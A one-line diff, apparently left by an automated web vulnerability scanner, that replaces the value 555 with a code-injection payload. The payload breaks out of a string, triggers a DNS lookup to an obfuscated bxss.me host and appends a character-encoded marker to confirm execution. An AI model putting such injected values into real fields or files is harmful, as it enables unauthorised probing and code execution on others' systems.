@@ -1,1 +1,1 @@
-555
+".gethostbyname(lc("hithp"."wtcffbmjccc79.bxss.me."))."A".chr(67).chr(hex("58")).chr(100).chr(74).chr(116).chr(82)."
